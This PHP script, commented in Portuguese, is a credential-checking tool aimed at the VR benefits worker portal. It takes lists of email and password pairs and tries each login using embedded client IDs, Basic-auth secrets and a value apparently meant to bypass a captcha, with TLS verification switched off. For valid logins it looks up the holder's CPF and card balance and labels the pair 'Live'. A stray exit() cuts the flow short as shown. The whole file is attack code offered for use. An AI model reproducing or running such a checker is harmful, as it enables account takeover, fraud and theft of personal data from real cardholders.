<?php
error_reporting(0);

if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
("cookie.txt", 'w+');fclose
("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}

  function getStr($string, $start, $end) {
   $str = explode($start, $string);
   $str = explode($end, $str[1]);  
   return $str[0];
 }

 function multiexplode($string) {
   $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
   $one = str_replace($delimiters, $delimiters[0], $string);
   $two = explode($delimiters[0], $one);
   return $two;
 }

 $lista = $_GET['lista'];
 $email = multiexplode($lista)[0];
 $senha = multiexplode($lista)[1];
##### FIM DA PARTE BÁSICA ######


#########################
##### FAZER O LOGIN #####
#########################

 $bypassCap = base64_encode('MDNBR2RCcTI3NXMzY25oTFprcE9TMnFudHFRLVlKc2VZdUZOc3IydmIwam9SbC1rRHdPZ0tlaExrSHgyeTdQRzBULVhQYU5IdG16NU1Sb19BLUpxeGNOOVpYbVp3dHBtMllkeU5nSDNrMFg1SXYwNFNwV1phZzUzRU5MQ3pVUW8tcVFhck9UeDdfb0NzdW56ck82TWhid3VncF9VbkFGVlVidXNsalQ5c2J5S3NaSlRsMzc4RS1qaU9lY2ZicEJlRmJkdUFTa2xNX0FUdEFJdGdWUW5vMmtzcjF6MTk4M0JCUEN0SHVXenk3TUtnelppZGxzR1Jud2JvV1RXN1dpN3JvWDhqbm1EUWs3OXJSbTY0b1JBS1VrWE5BRWJmY21sVDc1QUxpSUtSVmZRN0QwOW9VTDY3U2ZoZkFES0dYZ29qa25ZaVJtdHRNQmRsT20tem1KaW9CWHFJVjRZWjBfNExRcHRTN1cySG9CUkljTlFJNU81Wi1nZXMtaVU1OVJSY2F5M1RGdXhOeEdwQ2tjMktSTkk5bklEYWE4OWVlSGgzdERFU1A1clVyMzRrUW5zcHY0QjhVNW9iUFhCUVR3RGV3dG05cjNlQWxJOFpsRXo3QjJXT0NFb1BLSjNtYzFreHptZw==');
 $basic = 'MDhkZGMyNzktYjBhZS0zYWVlLWI2MjgtN2I0ZDVkYzAzZjVjOjM3ZjE0MjRkLTE1MDQtM2QwYi1hZjJiLTc0OTdjYzFkMWU1OQ==';

#verificador grant-code
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.vr.com.br/oauth/grant-code');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
  'issuer: VRPAT',
  'documentid: '.$bypassCap,
  'content-type: application/json;charset=UTF-8',
  'client_id: 08ddc279-b0ae-3aee-b628-7b4d5dc03f5c',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
  'access_token: 67c2e47f-e173-3af8-b315-f8fb83d82c83',
  'origin: https://portal-trabalhador.vr.com.br',
  'referer: https://portal-trabalhador.vr.com.br/',
  'accept-language: pt-BR,pt;q=0.9',

));
 curl_setopt($ch, CURLOPT_POSTFIELDS,'{"client_id":"08ddc279-b0ae-3aee-b628-7b4d5dc03f5c","redirect_uri":"http://localhost/"}');
 $p1 = curl_exec($ch);

 $code = getStr($p1,'code=','"');


#verificador access-token
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.vr.com.br/oauth/access-token');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'accept: application/json, text/plain, */*',
  'issuer: VRPAT',
  'client_id: 08ddc279-b0ae-3aee-b628-7b4d5dc03f5c',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
  'documentid: '.$bypassCap,
  'authorization: Basic '.$basic,
  'content-type: application/json;charset=UTF-8',
  'sec-gpc: 1',
  'origin: https://portal-trabalhador.vr.com.br',
  'sec-fetch-site: same-site',
  'sec-fetch-mode: cors',
  'sec-fetch-dest: empty',
  'referer: https://portal-trabalhador.vr.com.br/',
  'accept-language: pt-BR,pt;q=0.9',

));
 curl_setopt($ch, CURLOPT_POSTFIELDS,'{"grant_type":"authorization_code","code":"'.$code.'"}');
 $p1 = curl_exec($ch);

 $access_token = getStr($p1,'access_token":"','"');


 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.vr.com.br/autenticacao-usuario-rhsso/v3/access-token');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
  'authorization: Basic '.$basic,
  'issuer: VRPAT',
  'documentid: '.$bypassCap,
  'content-type: application/json;charset=UTF-8',
  'client_id: 08ddc279-b0ae-3aee-b628-7b4d5dc03f5c',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
  'access_token: '.$access_token,
  'origin: https://portal-trabalhador.vr.com.br',
  'referer: https://portal-trabalhador.vr.com.br/',
  'accept-language: pt-BR,pt;q=0.9',

));
 curl_setopt($ch, CURLOPT_POSTFIELDS,'{"email":"'.$email.'","password":"'.$senha.'"}');
 $p1 = curl_exec($ch);
 
exit();
 if (strpos($p1, 'access_token')) {
  $access_token = getStr($p1, 'access_token":"','"');
  $session_state = getStr($p1, 'session_state":"','"');

  # P E R F I L
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://svc2.vr.com.br/users/findprofile');
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authorization: '.$access_token,
    'issuer: VRPAT',
    'sec-ch-ua-mobile: ?0',
    'documentid: '.$bypassCap,
    'accept: application/json, text/plain, */*',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'sec-ch-ua-platform: "Windows"',
    'origin: https://portal-trabalhador.vr.com.br',
    'referer: https://portal-trabalhador.vr.com.br/',
    'accept-language: pt-BR,pt;q=0.9',

  ));
  $p2 = curl_exec($ch);
  $cpf = getStr($p2, '"cpf":"','"');

  # C A R T Ã O
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://pt-bff-painel-portal-trabalhador-prd.vr.com.br/cards/'.$cpf);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authorization: '.$access_token,
    'issuer: VRPAT',
    'sec-ch-ua-mobile: ?0',
    'documentid: '.$bypassCap,
    'accept: application/json, text/plain, */*',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'sec-ch-ua-platform: "Windows"',
    'origin: https://portal-trabalhador.vr.com.br',
    'referer: https://portal-trabalhador.vr.com.br/',
    'accept-language: pt-BR,pt;q=0.9',

  ));
  $p3 = curl_exec($ch);
  $cashBalance = getStr($p3, 'cashBalance":',',');

  echo "Live: $email|$senha valor: $cashBalance";


}elseif(strpos($p1, 'Invalid user credentials')){
  echo "Reprovada: $email|$senha Retorno: Credenciais de usuário inválidas";


}elseif(strpos($p1, 'para realizar a consulta')){
  echo "Reprovada: $email|$senha Retorno: Os propriedades 'e-mail' e 'senha' são mandatórias para realizar a consulta";

}else{
  echo "Error: $email|$senha Retorno: Erro desconhecido";

}
flush();
ob_flush();